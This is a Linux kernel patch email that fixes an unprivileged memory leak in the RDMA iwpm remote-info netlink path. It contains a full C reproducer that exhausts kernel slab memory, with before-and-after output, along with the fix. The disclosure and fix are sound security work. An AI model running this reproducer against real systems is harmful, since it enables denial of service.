Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.170
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794254618;
	b=5QkZSU7pfYRtN/Rs+J8GpVItz40yD9d5ULIS9cXnYxhLnvLUeQNSIFCwhka15XOzppV2
	 GrT+KVIVrL2Fd05CSy8YZzP5woOYHbHUYcKDlh2lMZ8011j1cokH7d7atN23apFLeozV5
	 iO0AGnOuFZoPKfgD4AgoVHTpZdzBqbCTuQsF4o1s8TCzu0lX80im+T3gOCpvuH+BtG8Y1
	 DgMQfOI5KNEoNm9kpkmfw3vwT1ScIFKY0V8Qa5Ktf2/DPiZzbBY1cvYs2x8zNG0fWBiu9
	 3zvSbfSURTlI7dJ3j1V45bV568a0IqIjdKgK19LUPEP/4ej4EjkNwQRJp9WMU+N+Szw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794254618;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=F7qtiYhq//Oa4yRKIVkAkJ2ybO07p3S5cPop3tivl6w=;
	b=eVZgGz5IVnyLSRdEN7sZgEy7u2GqtnB/CNeUcefgY5UFBfiDEDHtCRs7NX2m3gJXMEv7
	 MW01oMtDcwrS4xtkH5Ex3+rio/D+DDAyj3naDwIgm6Lac+OnxJzQ3P/sXKk7EI9SdJJik
	 Rd1tFuqX7nUFZ0qX+veISh34XGdBo8hJfmRcJRipVEMi6hza4cg2Vk/Pz1PE1VNSiQMqK
	 SmcxstAxNI2XSjJF03gtXGrBB+iQU+wCmBB51hjpyvBxBZ+7y41gQqjqZ1A3dnAys8SLx
	 wRl0Xeuw3cT2ByYdRnsVuKGibu4JN52E7GaZ+n/KrDoY17dnF7kzphQ+4E2vVUPZkGw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=GIYVFuuO;
	arc=none smtp.remote-ip=74.125.82.170
Received: from mail-dy1-f170.google.com (mail-dy1-f170.google.com [74.125.82.170])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DEB7E60A260A
	for <linux-kernel@vger.kernel.org>; Mon,  9 Nov 2026 20:03:37 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org DEB7E60A260A
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=GIYVFuuO
Received: by mail-dy1-f170.google.com with SMTP id 5a478bee46e88-36f6295304dso1638291eec.1
        for <linux-kernel@vger.kernel.org>; Mon, 09 Nov 2026 12:03:37 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794254617; x=1794859417; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=F7qtiYhq//Oa4yRKIVkAkJ2ybO07p3S5cPop3tivl6w=;
        b=GIYVFuuO/k6UZzcBy6BcZr4r1LZ+SW4FNzRdMs8bSVKhIhP1UJU8xNHSFhTuR6baHn
         e+/Wdnrpv7kC7udPW3hnihuJ04ZV6fRcr6WMD0n/hSoFhzOGJVXHuyJquoVriDhGB/gJ
         E5GCY+WweW8lrx3FqHgcg37yyrje6XLCfoK2eltc+LOZW0FBkdFgcPNwZhB0W/QEPB2P
         GfNp22XhlxSHvZQG+G2p0GDTDnNlPkfkvNTtxL71Sk5TtgasMwgd6e9+CRNcTvoIvfht
         f180Y5ZAIYWUDMgr03bCpeEbq0kxq/HfcT3UIgYuonwtOgdKVuJ6Agt1kjM4IG1deCR0
         cVQg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794254617; x=1794859417;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=F7qtiYhq//Oa4yRKIVkAkJ2ybO07p3S5cPop3tivl6w=;
        b=SlXlP9RTaKxMNcU9jCTOvtzxgTRSucin+/8JyNALVmj22CH6B6n2OaViDc67t5kO/w
         eqQOTEfFUP1kgh0WM058AZZ2sLk2y1IMM2VCvlJOHnLxwG719NcZk05FClbvbmBYb7Zy
         1vKKKKjz2uFzHQopccdWi4N+SSBvDeAG38jNUZ6Tpfxp+yGp7srZqCpykU7aw0pUNq+b
         bdm/sQwWlTZMhh0o27eDSL+7JWhqWKUC48gxEqG53duqs91MzxeKxhD54IF6SJgAzA7x
         Dkb7Dcv890aWnYguzWBML3jiNq5VF2l2MmefAlFM4vljCXebtP27ipLpkZ1z3OHqIPzv
         kh8w==
X-Forwarded-Encrypted: i=1; AL+hErF6sD7Py/cAgmDR35f55VnRKmsMEs5Us0Spxu9vc42sUs+3FztSTDua8pcQ3OhbG0ULSgjQpD5HeMYT/0c=@vger.kernel.org
X-Gm-Message-State: APuU4Z899IX/ZToli6cna8wtHwsjXsbVFDJA5iktfBoGhSQ6bnEbY6g6
	B0F2s8k1iS3SgSJ9SuGclpzwRAu/jihOz3TpdVKhYLhFmtzP1tbhuXGh
X-Gm-Gg: AYBFou2ggF6VQ6MAGFHTbf+vxhRh4sPBOC3LYgFdZXElNl6+dGMWD6W1Greve13N/wo
	wy5n+c+3NRly4UtoMtz1SZ6qJ6R/t/6hvZLmh8ufzMpKrr2SvEbjcGn4426+jHvzwgBSnqEt7JO
	c+sdnClJXqz6CJ1MaIa/1DEGCBzSyIPvbmmhnwY+ziSrAoz6xPraO5Hazkdn2/2B+Ot1m8O5/zj
	QJgna8FIlgf6NJvBti9zH4TKi5jNZnv4Xfn4vmf4uynR1/X8UDKv2REj3z3NtsglodyGaxuJISF
	dg5Hc7ZrZZdjAnmn5faNhuXsl225YVkOoRzPHSZbxF4aDKpARcf1CwoZx1aBiaV4bG6g+tCvvHH
	yrwb2qis8uLfWXkYsObg4LGn462gUts2jcTFyi2jcFVQOnS5KaIkuMBRTQ/CLRmjzILC1R95Ned
	JZIJjJOUYG1x+BrR0a0jlJrjg/0rLPiJvF2G13QCSFY18MFI1miursurBW58RodpkY5LTtaB/KI
	IVIh7a+ns4Q7eXh7KG6eyrWiZwvZs22mInisjDuGOKZ2mzCvVAXq7dS4XFumMPS5rpAqkfxWo8x
	7q1OucDOdo6eDbUFmKdgdCBykUuYk3FvIX+z+SQnnqXnlYjBBZp5gZCcwW/0hMaCuP7S7QI=
X-Received: by 2002:a05:7300:105:b0:35e:da0a:75b0 with SMTP id 5a478bee46e88-3751f560557mr359081eec.25.1794254616749;
        Mon, 09 Nov 2026 12:03:36 -0800 (PST)
Received: from localhost.localdomain ([112.170.44.210])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-37520cfe07dsm562497eec.20.2026.11.09.12.03.34
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 09 Nov 2026 12:03:36 -0800 (PST)
From: Junyoung Jang <graypanda.inzag@gmail.com>
To: Jason Gunthorpe <jgg@ziepe.ca>,
	Leon Romanovsky <leon@kernel.org>
Cc: Junyoung Jang <graypanda.inzag@gmail.com>,
	Jeffin Philip <jeffinphilip14@gmail.com>,
	linux-rdma@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH] RDMA/iwpm: fix memory leak in iwpm_add_remote_info()
Date: Tue, 10 Nov 2026 05:03:28 +0900
Message-ID: <20261109200330.2361828-1-graypanda.inzag@gmail.com>
X-Mailer: git-send-email 2.43.0
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

NETLINK_RDMA accepts requests addressed to kernel port ID 0 from a local
unprivileged socket. The IWCM RDMA_NL_IWPM_REMOTE_INFO callback has no
RDMA_NL_ADMIN_PERM flag, and RDMA netlink routes this IWCM opcode to its
dump callback even without NLM_F_DUMP.

iwpm_remote_info_cb() parses the six required attributes and only checks
that the local and mapped-local sockaddr_storage families match and that
the remote and mapped-remote families match. Four family-255 addresses
pass those checks. The callback allocates an iwpm_remote_info object
with GFP_ATOMIC and passes it to iwpm_add_remote_info(). There,
get_reminfo_hash_bucket() accepts only AF_INET and AF_INET6, so the
family-255 lookup returns NULL. The object is neither linked into
iwpm_reminfo_bucket nor freed, and the callback returns -EINVAL after
this allocation side effect.

iwpm_exit() only walks and frees linked hash entries, so closing the
netlink socket does not recover these orphaned objects. As a result, an
unprivileged local user in the initial network namespace can repeatedly
send this request without CAP_NET_ADMIN to permanently leak unreclaimable
kernel slab memory (kmalloc-512), leading to memory exhaustion and a
denial of service (DoS).

Initialize hash_bucket_head to NULL and, after the spinlock is released,
free rem_info if no bucket accepted it. Freeing after unlock also covers
the absent-table case without changing the protected list operation and
follows the existing null-bucket cleanup pattern in iwpm_add_mapinfo().

Fixes: 6eec17746175 ("RDMA/core: Enable the iWarp Port Mapper to provide the actual address of the connecting peer to its clients")
Signed-off-by: Junyoung Jang <graypanda.inzag@gmail.com>
---
Note: This patch addresses the unsupported-family orphan leak. A separate
valid-AF_INET route can insert duplicate remote-info entries without a
per-sender limit (as RDMA_NL_IWPM_REMOTE_INFO lacks RDMA_NL_ADMIN_PERM);
that growth can be addressed in a follow-up patch if desired.

Reproducer output on unpatched kernel (7.4.0-rc1):

    # kmalloc-512 before: active=801 total=816 size=512
    $ ./iwpm-remote-info-leak 1024 --control
    uid=1000
    mode=no-callback-control
    rounds=1024
    sunreclaim_before_kb=6672
    first_reply_type=2
    first_reply_len=580
    first_reply_status=-22
    sent=1024
    recv_count=1024
    sunreclaim_after_close_kb=6672
    sunreclaim_delta_close_kb=0
    sunreclaim_after_1s_kb=6684
    sunreclaim_delta_1s_kb=12
    # kmalloc-512 after control: active=801 total=816 size=512

    $ ./iwpm-remote-info-leak 1024
    uid=1000
    mode=unsupported-family
    rounds=1024
    sunreclaim_before_kb=6684
    first_reply_type=3
    first_reply_len=20
    first_reply_status=-22
    sent=1024
    recv_count=1024
    sunreclaim_after_close_kb=7188
    sunreclaim_delta_close_kb=504
    sunreclaim_after_1s_kb=7188
    sunreclaim_delta_1s_kb=504
    # kmalloc-512 after unsupported-family: active=1809 total=1824 size=512

Reproducer output on patched kernel (7.4.0-rc1 + this patch):

    # kmalloc-512 before: active=801 total=816 size=512
    $ ./iwpm-remote-info-leak 1024 --control
    uid=1000
    mode=no-callback-control
    rounds=1024
    sunreclaim_before_kb=6632
    first_reply_type=2
    first_reply_len=580
    first_reply_status=-22
    sent=1024
    recv_count=1024
    sunreclaim_after_close_kb=6632
    sunreclaim_delta_close_kb=0
    sunreclaim_after_1s_kb=6644
    sunreclaim_delta_1s_kb=12
    # kmalloc-512 after control: active=801 total=816 size=512

    $ ./iwpm-remote-info-leak 1024
    uid=1000
    mode=unsupported-family
    rounds=1024
    sunreclaim_before_kb=6644
    first_reply_type=3
    first_reply_len=20
    first_reply_status=-22
    sent=1024
    recv_count=1024
    sunreclaim_after_close_kb=6644
    sunreclaim_delta_close_kb=0
    sunreclaim_after_1s_kb=6644
    sunreclaim_delta_1s_kb=0
    # kmalloc-512 after unsupported-family: active=801 total=816 size=512

Reproducer (iwpm-remote-info-leak.c):

/* SPDX-License-Identifier: GPL-2.0-only */
#define _GNU_SOURCE
#include <errno.h>
#include <inttypes.h>
#include <linux/netlink.h>
#include <poll.h>
#include <rdma/rdma_netlink.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

/*
 * Exercise the IWPM remote-info callback with a complete netlink message
 * whose four sockaddr_storage values share an unsupported address family.
 * The --control mode sends the same attributes to an opcode with no callback.
 * Run in the initial network namespace of a disposable test kernel.
 */
#define MAX_ROUNDS 4096
#define REPLY_TIMEOUT_MS 3000

_Static_assert(sizeof(struct sockaddr_storage) == 128,
	       "IWPM expects 128-byte sockaddr_storage attributes");

static void fail(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(EXIT_FAILURE);
}

static unsigned long long sunreclaim_kb(void)
{
	char line[256];
	unsigned long long value;
	FILE *file = fopen("/proc/meminfo", "r");

	if (!file)
		fail("fopen /proc/meminfo");
	while (fgets(line, sizeof(line), file)) {
		if (sscanf(line, "SUnreclaim: %llu kB", &value) == 1) {
			if (fclose(file))
				fail("fclose /proc/meminfo");
			return value;
		}
	}
	if (ferror(file))
		fail("read /proc/meminfo");
	fclose(file);
	fputs("SUnreclaim is missing from /proc/meminfo\n", stderr);
	exit(EXIT_FAILURE);
}

static size_t add_attr(unsigned char *buf, size_t capacity, size_t offset,
		       unsigned short type, const void *data, size_t data_len)
{
	size_t length = NLA_HDRLEN + data_len;
	size_t aligned = NLA_ALIGN(length);
	struct nlattr *attr;

	if (offset > capacity || aligned > capacity - offset || length > UINT16_MAX) {
		fputs("request attribute buffer too small\n", stderr);
		exit(EXIT_FAILURE);
	}
	attr = (struct nlattr *)(buf + offset);
	attr->nla_type = type;
	attr->nla_len = length;
	memcpy((unsigned char *)attr + NLA_HDRLEN, data, data_len);
	return offset + aligned;
}

static size_t make_request(unsigned char *buf, size_t capacity,
			   uint32_t sequence, bool control)
{
	struct sockaddr_storage address = { .ss_family = 255 };
	struct nlmsghdr *header = (struct nlmsghdr *)buf;
	uint16_t error = 0;
	unsigned int opcode = control ? RDMA_NL_IWPM_REMOVE_MAPPING :
					RDMA_NL_IWPM_REMOTE_INFO;
	size_t offset = NLMSG_HDRLEN;

	memset(buf, 0, capacity);
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_MAPPING_SEQ,
			  &sequence, sizeof(sequence));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_LOCAL_ADDR,
			  &address, sizeof(address));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_REMOTE_ADDR,
			  &address, sizeof(address));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_MAPPED_LOC_ADDR,
			  &address, sizeof(address));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_MAPPED_REM_ADDR,
			  &address, sizeof(address));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_MAPPING_ERR,
			  &error, sizeof(error));
	header->nlmsg_len = offset;
	header->nlmsg_type = RDMA_NL_GET_TYPE(RDMA_NL_IWCM, opcode);
	header->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	header->nlmsg_seq = sequence;
	return offset;
}

static void receive_reply(int fd, uint32_t sequence, int expected_type,
			  unsigned int *reply_count, bool first)
{
	unsigned char buf[2048];
	struct pollfd pfd = { .fd = fd, .events = POLLIN };
	bool matched = false;

	while (!matched) {
		int ready;
		ssize_t length;
		int remaining;
		struct nlmsghdr *header;

		do {
			ready = poll(&pfd, 1, REPLY_TIMEOUT_MS);
		} while (ready < 0 && errno == EINTR);
		if (ready < 0)
			fail("poll NETLINK_RDMA");
		if (ready == 0) {
			fprintf(stderr, "no reply for sequence %u\n", sequence);
			exit(EXIT_FAILURE);
		}
		do {
			length = recv(fd, buf, sizeof(buf), 0);
		} while (length < 0 && errno == EINTR);
		if (length < 0)
			fail("recv NETLINK_RDMA");
		remaining = length;
		for (header = (struct nlmsghdr *)buf;
		     NLMSG_OK(header, remaining);
		     header = NLMSG_NEXT(header, remaining)) {
			int status;

			(*reply_count)++;
			if (header->nlmsg_seq != sequence)
				continue;
			if (header->nlmsg_type != expected_type)
				continue;
			if (header->nlmsg_len < NLMSG_LENGTH(sizeof(status))) {
				fputs("short netlink reply\n", stderr);
				exit(EXIT_FAILURE);
			}
			memcpy(&status, NLMSG_DATA(header), sizeof(status));
			if (first) {
				printf("first_reply_type=%u\n", header->nlmsg_type);
				printf("first_reply_len=%u\n", header->nlmsg_len);
				printf("first_reply_status=%d\n", status);
			}
			if (status != -EINVAL) {
				fprintf(stderr, "unexpected reply status %d\n", status);
				exit(EXIT_FAILURE);
			}
			matched = true;
		}
		if (remaining) {
			fputs("malformed netlink reply\n", stderr);
			exit(EXIT_FAILURE);
		}
	}
}

int main(int argc, char **argv)
{
	struct sockaddr_nl kernel = { .nl_family = AF_NETLINK };
	unsigned char request[576];
	unsigned long parsed;
	unsigned int rounds, replies = 0;
	unsigned long long before, after, later;
	bool control = false;
	char *end;
	int fd;

	if (argc < 2 || argc > 3) {
		fprintf(stderr, "usage: %s ROUNDS [--control]\n", argv[0]);
		return 2;
	}
	errno = 0;
	parsed = strtoul(argv[1], &end, 10);
	if (errno || !*argv[1] || *end || !parsed || parsed > MAX_ROUNDS) {
		fprintf(stderr, "ROUNDS must be between 1 and %d\n", MAX_ROUNDS);
		return 2;
	}
	if (argc == 3) {
		if (strcmp(argv[2], "--control")) {
			fprintf(stderr, "usage: %s ROUNDS [--control]\n", argv[0]);
			return 2;
		}
		control = true;
	}
	rounds = parsed;
	printf("uid=%u\nmode=%s\nrounds=%u\n", (unsigned int)getuid(),
	       control ? "no-callback-control" : "unsupported-family", rounds);
	before = sunreclaim_kb();
	printf("sunreclaim_before_kb=%llu\n", before);
	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_RDMA);
	if (fd < 0)
		fail("socket NETLINK_RDMA");
	for (uint32_t i = 1; i <= rounds; i++) {
		size_t length = make_request(request, sizeof(request), i, control);
		ssize_t sent;

		do {
			sent = sendto(fd, request, length, 0,
				      (struct sockaddr *)&kernel, sizeof(kernel));
		} while (sent < 0 && errno == EINTR);
		if (sent < 0)
			fail("sendto NETLINK_RDMA");
		if ((size_t)sent != length) {
			fputs("short netlink send\n", stderr);
			return EXIT_FAILURE;
		}
		receive_reply(fd, i, control ? NLMSG_ERROR : NLMSG_DONE,
			      &replies, i == 1);
	}
	printf("sent=%u\nrecv_count=%u\n", rounds, replies);
	if (close(fd))
		fail("close NETLINK_RDMA");
	after = sunreclaim_kb();
	printf("sunreclaim_after_close_kb=%llu\n", after);
	printf("sunreclaim_delta_close_kb=%lld\n",
	       (long long)after - (long long)before);
	sleep(1);
	later = sunreclaim_kb();
	printf("sunreclaim_after_1s_kb=%llu\n", later);
	printf("sunreclaim_delta_1s_kb=%lld\n",
	       (long long)later - (long long)before);
	return EXIT_SUCCESS;
}

 drivers/infiniband/core/iwpm_util.c | 5 ++++-
 1 file changed, 4 insertions(+), 1 deletion(-)

diff --git a/drivers/infiniband/core/iwpm_util.c b/drivers/infiniband/core/iwpm_util.c
index 51af8c1c49f9..215f70cfd113 100644
--- a/drivers/infiniband/core/iwpm_util.c
+++ b/drivers/infiniband/core/iwpm_util.c
@@ -236,7 +236,7 @@ static struct hlist_head *get_reminfo_hash_bucket(struct sockaddr_storage *,
 
 void iwpm_add_remote_info(struct iwpm_remote_info *rem_info)
 {
-	struct hlist_head *hash_bucket_head;
+	struct hlist_head *hash_bucket_head = NULL;
 	unsigned long flags;
 
 	spin_lock_irqsave(&iwpm_reminfo_lock, flags);
@@ -248,6 +248,9 @@ void iwpm_add_remote_info(struct iwpm_remote_info *rem_info)
 			hlist_add_head(&rem_info->hlist_node, hash_bucket_head);
 	}
 	spin_unlock_irqrestore(&iwpm_reminfo_lock, flags);
+
+	if (!hash_bucket_head)
+		kfree(rem_info);
 }
 
 /**
-- 
2.43.0
